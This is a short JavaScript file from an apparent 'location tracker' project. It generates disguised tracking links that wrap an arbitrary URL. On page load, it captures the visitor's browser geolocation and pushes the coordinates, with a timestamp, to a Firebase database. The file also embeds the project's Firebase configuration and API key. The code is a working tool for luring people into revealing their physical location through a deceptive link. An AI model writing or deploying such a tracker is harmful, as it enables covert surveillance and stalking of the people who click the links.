import { initializeApp } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBb_fTtLdRVHXmK8SDqrb2Cmfz66JdTxxI",
    authDomain: "projeto-68121.firebaseapp.com",
    projectId: "projeto-68121",
    storageBucket: "projeto-68121.firebasestorage.app",
    messagingSenderId: "39923570106",
    appId: "1:39923570106:web:dd1108773c2d087cebb983",
    measurementId: "G-1G1F8RQRN6"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const urlInput = document.getElementById('urlInput');
const createLinkButton = document.getElementById('createLinkButton');
const trackingLink = document.getElementById('trackingLink');

createLinkButton.addEventListener('click', () => {
    const url = urlInput.value;
    const trackingId = generateTrackingId();
    const trackingUrl = `https://lavinia0cristine0souza.github.io/rastreador-localizacao/track?id=${trackingId}&url=${encodeURIComponent(url)}`;
    trackingLink.textContent = trackingUrl;
});

function generateTrackingId() {
    return Math.random().toString(36).substring(2, 15);
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            sendLocationToFirebase(latitude, longitude);
        });
    }
}

function sendLocationToFirebase(latitude, longitude) {
    push(ref(database, 'locations/'), {
        latitude: latitude,
        longitude: longitude,
        timestamp: Date.now()
    });
}

window.onload = function() {
    getLocation();
};
